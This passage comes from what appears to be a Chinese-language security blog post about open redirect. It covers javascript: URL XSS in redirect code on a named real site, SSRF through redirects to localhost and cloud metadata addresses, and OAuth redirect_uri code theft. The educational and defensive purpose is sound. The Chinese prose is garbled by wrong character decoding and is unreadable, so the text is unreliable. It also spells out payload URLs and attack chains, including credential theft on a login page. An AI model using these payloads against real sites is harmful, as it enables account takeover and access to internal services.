å¯èƒ½æœƒç–‘æƒ‘é‡æ–°å°å‘è·Ÿ XSS æœ‰ä»€éº¼é—œä¿‚ï¼Œæˆ‘å€‘å…ˆä¾†å›é¡§ä¸€ä¸‹å‰ç«¯é‡æ–°å°å‘çš„ç¨‹å¼ç¢¼ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> searchParams <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URLSearchParams</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">)</span><br>window<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> searchParams<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'redirect'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>é€™æ¨£æœƒæœ‰ä»€éº¼å•é¡Œå‘¢ï¼Ÿ</p>\n<p>åœ¨ JS è£¡é¢æœ‰å€‹æ‡‰è©²ä¸å°‘äººçœ‹éï¼Œä½†å¯èƒ½æ¯”è¼ƒå°‘ç”¨çš„æ±è¥¿ï¼Œå«åš JavaScript pseudo protocolï¼Œåƒæ˜¯é€™æ¨£ï¼š</p>\n<pre><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;\n</code></pre>\n<p>é»äº†é‚£å€‹ a ä¹‹å¾Œï¼ŒæœƒåŸ·è¡Œ JS è·³å‡ºä¸€å€‹ alertã€‚è€Œé€™æ‹›é™¤äº†å¯ä»¥ç”¨åœ¨ href ä»¥å¤–ï¼Œå…¶å¯¦ä¹Ÿå¯ä»¥ç”¨åœ¨ location ä¸Šé¢ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">window<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> <span class=\"token string\">'javascript:alert(1)'</span></code></pre>\n<p>æ‰“é–‹ä½ çš„ç€è¦½å™¨é–‹æ–°åˆ†é ï¼Œç„¶å¾Œåœ¨ devtool console ç›´æ¥åŸ·è¡Œä¸Šé¢é‚£ä¸€æ®µï¼Œæœƒç™¼ç¾ alert çœŸçš„è·³å‡ºä¾†äº†ï¼Œè€Œä¸”ä»¥ä¸‹å¹¾ç¨®æ–¹å¼éƒ½æœƒè§¸ç™¼ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> <span class=\"token string\">'javascript:alert(1)'</span><br>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token string\">'javascript:alert(1)'</span><span class=\"token punctuation\">)</span><br>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'javascript:alert(1)'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>å› æ­¤æ”»æ“Šè€…åªè¦æŠŠ redirect çš„ä½ç½®è¨­ç½®æˆ <code>javascript:xxx</code>ï¼Œå°±å¯ä»¥åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ï¼Œè§¸ç™¼ XSSã€‚é€™å€‹æ¡ˆä¾‹å‰ç«¯çš„æœ‹å‹å€‘ä¸€å®šè¦ç‰¹åˆ¥æ³¨æ„ï¼Œå› ç‚ºç›´æ¥æŠŠå€¼ assign çµ¦ location æ˜¯å€‹å¾ˆå¸¸è¦‹çš„å¯¦ä½œæ–¹å¼ã€‚</p>\n<p>åº•ä¸‹ç›´æ¥å¸¶å¤§å®¶çœ‹ä¸€å€‹çœŸå¯¦ä¸–ç•Œçš„æ¡ˆä¾‹ï¼Œå°è±¡æ˜¯ä¹‹å‰åœ¨å¦ä¸€ç¯‡æ–‡ç« ï¼š<a href=\"https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/\">é˜²æ­¢ XSS å¯èƒ½æ¯”æƒ³åƒä¸­å›°é›£</a>å‡ºç¾éçš„ç¶²ç«™ï¼š<a href=\"https://matters.news/\">Matters News</a>ã€‚</p>\n<p>é€™æ˜¯ä»–å€‘çš„ç™»å…¥é é¢ï¼š</p>\n<p><img src=\"/img/posts/huli/open-redirect/matters.png\" alt=\"\"></p>\n<p>åœ¨é»ä¸‹ç™»å…¥ä¹‹å¾Œï¼Œæœƒå‘¼å«ä¸€å€‹å«åš <code>redirectToTarget</code> çš„ functionï¼Œè€Œé€™å€‹å‡½å¼çš„ç¨‹å¼ç¢¼æ˜¯é€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">/**<br> * Redirect to \"?target=\" or fallback URL with page reload.<br> *<br> * (works on CSR)<br> */</span><br><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> redirectToTarget <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>  fallback <span class=\"token operator\">=</span> <span class=\"token string\">'current'</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>  fallback<span class=\"token operator\">?</span><span class=\"token operator\">:</span> <span class=\"token string\">'homepage'</span> <span class=\"token operator\">|</span> <span class=\"token string\">'current'</span><br><span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> fallbackTarget <span class=\"token operator\">=</span><br>    fallback <span class=\"token operator\">===</span> <span class=\"token string\">'homepage'</span><br>      <span class=\"token operator\">?</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">/</span><span class=\"token template-punctuation string\">`</span></span> <span class=\"token comment\">// FIXME: to purge cache</span><br>      <span class=\"token operator\">:</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<br>  <span class=\"token keyword\">const</span> target <span class=\"token operator\">=</span> <span class=\"token function\">getTarget</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> fallbackTarget<br><br>  window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> <span class=\"token function\">decodeURIComponent</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>åœ¨æ‹¿åˆ° target ä¹‹å¾Œç›´æ¥ä½¿ç”¨äº†ï¼š<code>window.location.href = decodeURIComponent(target)</code> ä¾†åšé‡æ–°å°å‘ã€‚è€Œ <code>getTarget</code> å…¶å¯¦å°±æ˜¯å» url query string æŠŠ target çš„å€¼æ‹¿å‡ºä¾†ã€‚æ‰€ä»¥å¦‚æœç™»å…¥çš„ç¶²å€æ˜¯ï¼š<code>https://matters.news/login?target=javascript:alert(1)</code>ï¼Œåœ¨ä½¿ç”¨è€…æŒ‰ä¸‹ç™»å…¥ä¸¦ä¸”æˆåŠŸä¹‹å¾Œï¼Œå°±æœƒè·³å‡ºä¸€å€‹ alertï¼Œè§¸ç™¼ XSSï¼</p>\n<p>ä¸åƒ…å¦‚æ­¤ï¼Œé€™å€‹ XSS ä¸€æ—¦è¢«è§¸ç™¼äº†ï¼Œå½±éŸ¿åŠ›éåŒå°å¯ï¼Œå› ç‚ºé€™æ˜¯ç™»å…¥é é¢ï¼Œæ‰€ä»¥åœ¨é€™å€‹é é¢ä¸ŠåŸ·è¡Œçš„ XSSï¼Œå¯ä»¥ç›´æ¥æŠ“å– input çš„å€¼ï¼Œä¹Ÿå°±æ˜¯å·åˆ°ä½¿ç”¨è€…çš„å¸³è™Ÿå¯†ç¢¼ã€‚å¦‚æœè¦åŸ·è¡Œå¯¦éš›çš„æ”»æ“Šï¼Œå¯ä»¥é‡å°ç¶²ç«™çš„ä½¿ç”¨è€…å¯„ç™¼é‡£é­šä¿¡ï¼Œåœ¨ä¿¡ä¸­æ”¾å…¥é€™å€‹æƒ¡æ„é€£çµè®“ä½¿ç”¨è€…é»æ“Šï¼Œç”±æ–¼ç¶²å€æ˜¯æ­£å¸¸çš„ç¶²å€ï¼Œé»æ“Šä¹‹å¾Œåˆ°çš„é é¢ä¹Ÿæ˜¯çœŸçš„ç¶²ç«™çš„é é¢ï¼Œå› æ­¤å¯ä¿¡ç¨‹åº¦æ‡‰è©²æ»¿é«˜çš„ã€‚</p>\n<p>åœ¨ä½¿ç”¨è€…è¼¸å…¥å¸³è™Ÿå¯†ç¢¼ä¸¦ä¸”ç™»å…¥ä¹‹å¾Œï¼Œç”¨ XSS æŠŠå¸³è™Ÿå¯†ç¢¼å·èµ°ä¸¦æŠŠä½¿ç”¨è€…å°å›é¦–é ï¼Œå°±å¯ä»¥ä¸ç•™ç—•è·¡åœ°å·èµ°ä½¿ç”¨è€…å¸³è™Ÿï¼Œé”æˆå¸³è™Ÿå¥ªå–ã€‚</p>\n<p>ä¿®å¾©æ–¹å¼æ˜¯åªå…è¨± http/https é–‹é ­çš„ç¶²å€ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> fallbackTarget <span class=\"token operator\">=</span><br>  fallback <span class=\"token operator\">===</span> <span class=\"token string\">'homepage'</span><br>    <span class=\"token operator\">?</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">/</span><span class=\"token template-punctuation string\">`</span></span> <span class=\"token comment\">// FIXME: to purge cache</span><br>    <span class=\"token operator\">:</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<br><span class=\"token keyword\">let</span> target <span class=\"token operator\">=</span> <span class=\"token function\">decodeURIComponent</span><span class=\"token punctuation\">(</span><span class=\"token function\">getTarget</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">const</span> isValidTarget <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^((http|https):\\/\\/)</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><br><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>isValidTarget<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  target <span class=\"token operator\">=</span> fallbackTarget<br><span class=\"token punctuation\">}</span><br><br>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> target <span class=\"token operator\">||</span> fallbackTarget</code></pre>\n<p>ä¸éé€™æ¨£å…¶å¯¦æ˜¯å…ˆæŠŠé‡æ–°å°å‘åŠŸèƒ½çš„ XSS ä¿®æ‰è€Œå·²ï¼Œopen redirect çš„éƒ¨åˆ†ä¾èˆŠå­˜åœ¨ï¼Œéœ€è¦é€²ä¸€æ­¥å° domain åšæª¢æŸ¥æ‰èƒ½æ’é™¤ open redirectã€‚</p>\n<p>å†æ¬¡æé†’ï¼Œé€™å€‹æ¼æ´æ»¿å¤šå·¥ç¨‹å¸«éƒ½ä¸æœƒç™¼ç¾ï¼Œå› ç‚ºä¸çŸ¥é“ <code>window.location.href</code> å¯ä»¥æ”¾ <code>javascript:alert(1)</code> é€™æ¨£çš„ç¶²å€ä¾†åŸ·è¡Œç¨‹å¼ç¢¼ï¼Œå¦‚æœå¤§å®¶æœ‰å¯¦ä½œåˆ°é‡æ–°å°å‘çš„åŠŸèƒ½ï¼Œè¨˜å¾—æ³¨æ„ä¸€ä¸‹é€™å€‹å•é¡Œã€‚</p>\n<h2 id=\"open-redirect-%E8%88%87%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E9%85%8D\"><a class=\"direct-link\" href=\"#open-redirect-%E8%88%87%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E9%85%8D\">#</a> Open redirect èˆ‡å…¶ä»–æ¼æ´çš„æ­é…</h2>\n<p>å¾ä¸Šé¢å…©å€‹å•é¡Œå¯ä»¥çœ‹å‡ºå…‰æ˜¯ã€Œå¯¦ä½œé‡æ–°å°å‘ã€å°±å¯èƒ½æœƒå¯«å‡ºæœ‰æ¼æ´çš„ç¨‹å¼ç¢¼ï¼Œè€Œæ¥ä¸‹ä¾†è¦è«‡çš„æ˜¯ã€Œé‡æ–°å°å‘ã€é€™å€‹åŠŸèƒ½èˆ‡å…¶ä»–æ¼æ´çš„çµåˆã€‚æœ‰è‡³å°‘å…©å€‹é¡å‹çš„æ¼æ´éƒ½æœ‰æ©Ÿæœƒèˆ‡ open redirect çµåˆï¼Œä¸€å€‹æ˜¯ SSRFï¼Œå¦ä¸€å€‹æ˜¯ OAuth çš„æ¼æ´ã€‚</p>\n<p>SSRFï¼Œå…¨åç‚º Server-Side Request Forgeryï¼Œé€šå¸¸ç¿»ä½œä¼ºæœå™¨è«‹æ±‚å½é€ ï¼Œé—œæ–¼é€™å€‹æ¼æ´è©³ç´°çš„ä»‹ç´¹è·Ÿæ”»æ“Šæœªä¾†å¯èƒ½å†å¯«ä¸€ç¯‡è·Ÿå¤§å®¶ä»‹ç´¹ï¼Œæˆ‘é€™é‚Šå…ˆç°¡å–®è¬›ä¸€ä¸‹ã€‚</p>\n<p>é€šå¸¸åœ¨å…§éƒ¨çš„ Serverï¼Œéƒ½ä¸æœƒè®“å¤–éƒ¨ç›´æ¥å­˜å–åˆ°ï¼Œå°å¤–å¯èƒ½åªæœƒæœ‰ä¸€å° proxy æŠŠ request forward åˆ°å°æ‡‰çš„ä¸»æ©Ÿã€‚å‡è¨­æœ‰ä¸€å€‹æœå‹™çš„ä¼ºæœå™¨æ¶æ§‹å¦‚ä¸‹åœ–æ‰€ç¤ºï¼ŒèƒŒå¾Œæœ‰ä¸€å° Back-end Server æœƒå»å‘¼å«éš±è—åœ¨å…§ç¶²ä¸­çš„ PDF service ç”¢ç”Ÿ PDF æª”æ¡ˆï¼š</p>\n<p><img src=\"/img/posts/huli/open-redirect/ssrf.png\" alt=\"\"></p>\n<p>è€Œé€™å€‹ PDF service é™åˆ¶ç¶²å€åªèƒ½æ˜¯ <a href=\"https://example.com\">https://example.com</a> é–‹é ­ï¼Œé¿å…æœ‰äººå‚³å…¥å…¶ä»–ç¶²å€é€²ä¾†ã€‚é€™æ™‚å¦‚æœæŸå€‹ URL æœ‰ open redirect çš„æ¼æ´ï¼Œæ”»æ“Šè€…å°±å¯ä»¥å‚³å…¥ï¼š<code>https://example.com?redirect=http://127.0.0.1</code>ï¼Œè®“ PDF service å»é€ è¨ªé€™å€‹ç¶²å€ï¼Œè€Œè¢«è½‰å€åˆ° 127.0.0.1ï¼Œä¸¦ä¸”å›å‚³å®ƒçš„å…§å®¹ã€‚</p>\n<p>é€™æ¨£å°±å«åš SSRFï¼Œä½ é€éå…§éƒ¨çš„æœå‹™ï¼ŒæˆåŠŸç™¼äº†ä¸€å€‹ request åˆ°å¤–ç¶²é€²ä¸å»çš„ serviceï¼Œå¦‚æ­¤ä¸€ä¾†ä½ å°±å¯ä»¥å»çœ‹çœ‹å…§ç¶²é‚„æœ‰ä»€éº¼å…¶ä»–æœå‹™å­˜åœ¨ï¼Œä¾‹å¦‚èªª Redis æˆ–æ˜¯ MySQL ç­‰ç­‰ï¼Œé€™äº›ç›´æ¥å¾å¤–ç¶²éƒ½é€²ä¸å»ï¼Œä½†é€é SSRF å°±å¯ä»¥ã€‚æˆ–æ›´ç°¡å–®çš„æ–¹å¼æ˜¯å»çœ‹ä¸€äº› cloud ç›¸é—œçš„æª”æ¡ˆï¼Œæœ‰äº› cloud æœå‹™åªè¦å­˜å– <a href=\"http://169.254.169.254\">http://169.254.169.254</a> å°±æœƒçœ‹åˆ°ä¸€äº› metadataï¼Œæœ‰èˆˆè¶£å¯ä»¥çœ‹é€™é‚Šï¼š<a href=\"https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#exploitation-in-cloud\">Abusing SSRF in AWS EC2 environment</a>ã€‚</p>\n<p>æ‰€ä»¥é€é open redirectï¼Œå¯ä»¥ç¹éåŸæœ¬æœ‰åšç¶²å€æª¢æŸ¥çš„åœ°æ–¹ã€‚</p>\n<p>ç¬¬äºŒå€‹æœƒç¢°åˆ°çš„å•é¡Œå‰‡æ˜¯è·Ÿ OAuth æœ‰é—œï¼Œåœ¨ OAuth çš„æµç¨‹ä¸­é€šå¸¸éƒ½æœƒæœ‰ä¸€å€‹ redirect_uriï¼Œæ¥æ”¶æˆæ¬Šå®Œç•¢ä¹‹å¾Œçš„ä¸€å€‹ codeï¼Œä»¥ Facebook ç‚ºä¾‹çš„è©±æ˜¯é•·é€™æ¨£ï¼š</p>\n<pre><code>https://www.facebook.com/v11.0/dialog/oauth?\n  client_id={app-id}\n  &amp;redirect_uri={&quot;https://example.com/login&quot;}\n  &amp;state={&quot;{st=state123abc,ds=123456789}&quot;}\n</code></pre>\n<p>ä½¿ç”¨è€…é»æ“Šç¶²å€å¾Œæœƒè·³åˆ° Facebookï¼ŒæŒ‰ä¸‹æˆæ¬Šå°±æœƒè¢«å°åˆ° <a href=\"https://example.com/login\">https://example.com/login</a> ä¸¦ä¸”å¯ä»¥åœ¨ç¶²å€ä¸­æ‹¿åˆ° code æˆ–æ˜¯ tokenï¼Œæ¥è‘—å°±å¯ä»¥ç”¨é€™å€‹æ­é… client id è·Ÿ client secretï¼Œæ‹¿åˆ° auth tokenï¼Œä¸¦ä¸”ç”¨é€™å€‹ auth token ä»£è¡¨ä½¿ç”¨è€…å»è·Ÿ Facebook æ‹¿å–è³‡æ–™ã€‚</p>\n<p>å¦‚æœ redirect_uri çš„ä¿è­·æ²’æœ‰åšå¥½ï¼Œæ”»æ“Šè€…å°±å¯ä»¥æŠŠå®ƒæ›æˆå…¶ä»–å€¼ï¼Œä¾‹å¦‚èªªï¼š<code>redirect_uri=https://huli.tw</code>ï¼Œé€™æ¨£ä½¿ç”¨è€…é»æ“Šæˆæ¬Šä»¥å¾Œï¼Œå°±æœƒæŠŠé©—è­‰ç”¨çš„ code å‚³åˆ°æˆ‘çš„ç¶²ç«™ï¼Œè€Œä¸æ˜¯é æœŸä¸­çš„ç¶²ç«™ã€‚</p>\n<p>ä½†ä¸€èˆ¬ä¾†èªª redirect_uri éƒ½æœƒé™åˆ¶ domainï¼Œæ‰€ä»¥æ²’é‚£éº¼ç°¡å–®å°±å¯ä»¥ç¹éã€‚é€™æ™‚å€™å°±è¦è«‹å‡º open redirect ç™»å ´äº†ï¼Œå¦‚æœç¶²ç«™æœ‰é€™å€‹æ¼æ´çš„è©±ï¼Œå°±å¯ä»¥é€™æ¨£ï¼š<code>redirect_uri=https://example.com?redirect=https://huli.tw</code>ï¼Œå¦‚æ­¤ä¸€ä¾†å°±ç®—ç¬¦åˆ domain é™åˆ¶ï¼Œæœ€å¾Œå°å‘çš„åœ°æ–¹ä¾ç„¶æ˜¯å€‹å¤–éƒ¨ç¶²ç«™ï¼Œæ”»æ“Šè€…ä¸€æ¨£å¯ä»¥å·åˆ°é©—è­‰ç”¨çš„ codeã€‚</p>\n<p>æ‰€ä»¥ç‚ºäº†é¿å…é€™é¡å‹çš„æ”»æ“Šï¼ŒFacebook æˆ– Google é€™ç¨®å¤§å‹æœå‹™åœ¨è¨­ç½® App çš„æ™‚å€™éƒ½æœƒåŠ å¼·é™åˆ¶ï¼Œredirect_uri é€šå¸¸éƒ½æœƒè¦æ±‚å¯«æ­»ï¼Œä¸è®“ä½ è¨­ç½® wildcardï¼Œä¾‹å¦‚èªªæˆ‘å¡« <code>https://example.com/auth</code>ï¼Œå°±æ˜¯çœŸçš„åªæœ‰é€™å€‹ç¶²å€å¯ä»¥éï¼Œå…¶ä»–ä¸åŒ path çš„ç¶²å€éƒ½æœƒå¤±æ•—ã€‚ä½†æœ‰äº›å°å…¬å¸æ²’æœ‰æ³¨æ„åˆ°é€™éº¼ç´°ï¼Œå°æ–¼ redirect_uri å°±æ²’æœ‰é€™éº¼å¤šè¦ç¯„ã€‚</p>\n<p>åƒæ˜¯é€™ç¨® OAuth çµåˆ open redirect é”æˆ account takeoverï¼ˆå¸³è™Ÿå¥ªå–ï¼‰çš„ä¾‹å­å…¶å¯¦ä¸å°‘ï¼Œä¾‹å¦‚èªªé€™å€‹ï¼š<a href=\"https://hackerone.com/reports/905607\">[cs.money] Open Redirect Leads to Account Takeover</a>ï¼Œæˆ–æ˜¯ GitHub å…¶å¯¦ä¹Ÿæœ‰éé€™é¡å‹çš„æ¼æ´ï¼š<a href=\"https://devcraft.io/2020/10/19/github-gist-account-takeover.html\">GitHub Gist - Account takeover via open redirect - $10,000 Bounty</a>ï¼Œè€Œé€™å€‹ Airbnb çš„æ¼æ´ä¹Ÿå¾ˆç²¾å½©ï¼š<a href=\"https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/\">Authentication bypass on Airbnb via OAuth tokens theft</a>ã€‚</p>\n<p>ç¸½çµä¸€ä¸‹ï¼Œopen redirect çš„ç”¨è™•é™¤äº†è®“ä½¿ç”¨è€…æ”¾é¬†æˆ’å¿ƒä¾†é€²è¡Œé‡£é­šä»¥å¤–ï¼Œå¦ä¸€å€‹å°±æ˜¯ç¹éæœ‰é‡å° domain é€²è¡Œæª¢æŸ¥çš„åœ°æ–¹ã€‚ä¸Šé¢è¬›çš„ SSRF è·Ÿ OAuth é€™å…©å€‹æ¼æ´ä¹‹æ‰€ä»¥èƒ½è·Ÿå®ƒçµåˆï¼Œå°±æ˜¯å› ç‚ºå¯ä»¥ç”¨ open redirect ä¾†ç¹éå° domain çš„æª¢æŸ¥ã€‚</p>\n<h2 id=\"%E9%82%A3%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%E7%A6%A6-open-redirect%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%82%A3%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%E7%A6%A6-open-redirect%EF%BC%9F\">#</a> é‚£è©²æ€éº¼é˜²ç¦¦ open redirectï¼Ÿ</h2>\n<p>å¦‚æœæƒ³é˜²æ­¢ open redirectï¼Œå¯æƒ³è€ŒçŸ¥å°±æ˜¯è¦å°é‡æ–°å°å‘çš„ç¶²å€é€²è¡Œæª¢æŸ¥ã€‚é€™è½èµ·ä¾†ç°¡å–®ï¼Œå¯¦ä½œèµ·ä¾†å»å®¹æ˜“å‡ºç¾æ¼æ´ï¼Œä¾‹å¦‚èªªåº•ä¸‹çš„ä¾‹å­æ˜¯ä¸€æ®µæª¢æŸ¥ domain çš„ç¨‹å¼ç¢¼ï¼Œæ ¹æ“šå–å‡ºçš„ hostname æ¯”å°æ˜¯å¦å«æœ‰ <code>cymetrics.io</code>ï¼Œæœ‰çš„è©±å°±é€šéï¼Œç›®çš„æ˜¯åªæœ‰ <a href=\"http://cymetrics.io\">cymetrics.io</a> è·Ÿå®ƒçš„ subdomain å¯ä»¥é€šéï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> validDomain <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics.io'</span><br><span class=\"token keyword\">function</span> <span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">url</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> host <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname <span class=\"token comment\">// å–å‡º hostname</span><br>  <span class=\"token keyword\">return</span> host<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>validDomain<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://example.com'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// false</span><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://cymetrics.io'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://dev.cymetrics.io'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></code></pre>\n<p>æ„Ÿè¦ºå¥½åƒæ²’ä»€éº¼å•é¡Œï¼Ÿé™¤äº† <code>cymetrics.io</code> æˆ–æ˜¯å®ƒçš„ subdomain ä»¥å¤–ï¼Œæ‡‰è©²ä¸æœƒæœ‰å…¶ä»–ç¶²åŸŸå¯ä»¥é€šéé€™æª¢æŸ¥å§ï¼Ÿ</p>\n<p>é›–ç„¶çœ‹ä¼¼å¦‚æ­¤ï¼Œä½†å…¶å¯¦æœ‰å…©å€‹æ–¹å¼å¯ä»¥ç¹éã€‚é€™é‚Šå…ˆå‡è¨­ URL parsing çš„æ–¹å¼ä¸æœƒæœ‰å•é¡Œï¼Œä¸€å®šæœƒæ‹¿åˆ° hostnameï¼Œæ‰€ä»¥ <code>attacker.com?q=cymetrics.io</code> é€™ç¨®æ–¹å¼æ˜¯æ²’ç”¨çš„ï¼Œhostname æœƒæ‹¿åˆ° <code>attacker.com</code> è€Œå·²ã€‚</p>\n<p>å¤§å®¶å¯ä»¥æƒ³ä¸€ä¸‹æœ‰å“ªå…©ç¨®å¯ä»¥ç¹éï¼Œåœ¨å…¬ä½ˆç­”æ¡ˆä¹‹å‰ï¼Œå…ˆä¾†çœ‹ä¸‹ä¸€å€‹æ®µè½ã€‚</p>\n<h2 id=\"google-%E5%B0%8D%E6%96%BC-open-redirect-%E7%9A%84%E7%9C%8B%E6%B3%95\"><a class=\"direct-link\" href=\"#google-%E5%B0%8D%E6%96%BC-open-redirect-%E7%9A%84%E7%9C%8B%E6%B3%95\">#</a> Google å°æ–¼ open redirect çš„çœ‹æ³•</h2>\n<p>Google åœ¨å®˜æ–¹ç¶²ç«™ <a href=\"https://sites.google.com/site/bughunteruniversity/nonvuln/open-redirect\">Bughunter University</a> ç•¶ä¸­æœ‰æ˜ç¢ºæåˆ°ä¸€èˆ¬çš„ open redirect ä¸æœƒè¢«è¦–ç‚ºå®‰å…¨æ€§ä¸Šçš„æ¼æ´ï¼Œé™¤éèƒ½è­‰æ˜å®ƒå¯ä»¥è·Ÿå…¶ä»–æ¼æ´çµåˆåœ¨ä¸€èµ·ä½¿ç”¨ã€‚</p>\n<p>é‚£æ˜¯ä¸æ˜¯æœ‰äººæˆåŠŸéå‘¢ï¼Ÿç•¶ç„¶ï¼Œåº•ä¸‹æˆ‘èˆ‰å…©å€‹ä¾‹å­ã€‚</p>\n<p>ç¬¬ä¸€å€‹ä¾‹å­ä¾†è‡ªé€™ç¯‡æ–‡ç« ï¼š<a href=\"https://blog.bentkowski.info/2018/07/vulnerability-in-hangouts-chat-aka-how.html\">Vulnerability in Hangouts Chat: from open redirect to code execution</a>ï¼Œå°è±¡æ˜¯ Google Hangouts Chat çš„ Electron Appã€‚</p>\n<p>åœ¨é‚£å€‹ App è£¡é¢å¦‚æœç¶²å€æ˜¯ <code>https://chat.google.com</code> é–‹é ­çš„è©±ï¼Œé»æ“Šç¶²å€å°±æœƒç›´æ¥åœ¨ Electron è£¡é¢é–‹å•Ÿç¶²é ï¼Œè€Œä¸æ˜¯ç”¨ç€è¦½å™¨å»é–‹ã€‚å› æ­¤åªè¦æ‰¾åˆ° <code>https://chat.google.com</code> çš„ open redirectï¼Œå°±å¯ä»¥æŠŠä½¿ç”¨è€…å°å»é‡£é­šç¶²ç«™ã€‚è€Œ Electron App è·Ÿç€è¦½å™¨çš„å·®ç•°ä¹‹ä¸€å°±åœ¨æ–¼ Electron App é è¨­æ˜¯ä¸æœƒæœ‰ç¶²å€åˆ—çš„ï¼Œæ‰€ä»¥ä½¿ç”¨è€…æ ¹æœ¬ç„¡å¾è¾¨åˆ¥é€™æ˜¯ä¸æ˜¯é‡£é­šç¶²ç«™ã€‚è©³ç´°çš„æµç¨‹è·Ÿæœ€å¾Œçš„ payload å¯ä»¥åƒè€ƒåŸæ–‡ï¼Œé€™å€‹æ¼æ´é‚„å¯ä»¥é€²ä¸€æ­¥æå‡æˆ RCEï¼ˆä¸éæˆ‘ä¸çŸ¥é“æ˜¯æ€éº¼åšçš„å°±æ˜¯äº†ï¼‰ï¼Œåƒ¹å€¼ 7500 USDã€‚</p>\n<p>ç¬¬äºŒå€‹ä¾‹å­ä¾†è‡ªå®˜æ–¹çš„æ–‡ç« ï¼š<a href=\"https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter\">Open redirects that matter</a>ï¼Œé€™å€‹æ¡ˆä¾‹ä¹Ÿæ˜¯è¶…å¸¥ã€‚</p>\n<p>åœ¨ Google I/O 2015 çš„ç¶²ç«™ä¸­æœ‰å€‹åŠŸèƒ½æ˜¯å»æŠ“ Picasa çš„è³‡æ–™å›ä¾†ä¸¦ render æˆ JSONï¼Œä½†å› ç‚ºæœ‰è·¨ç¶²åŸŸçš„å•é¡Œï¼Œå› æ­¤å¾Œç«¯å¯«äº†ä¸€å€‹ç°¡å–®çš„ proxy å»æ‹¿è³‡æ–™ï¼Œåƒé€™æ¨£ï¼š<code>/api/v1/photoproxy?url=to</code>ï¼Œè€Œé€™å€‹ proxy æœƒæª¢æŸ¥ url 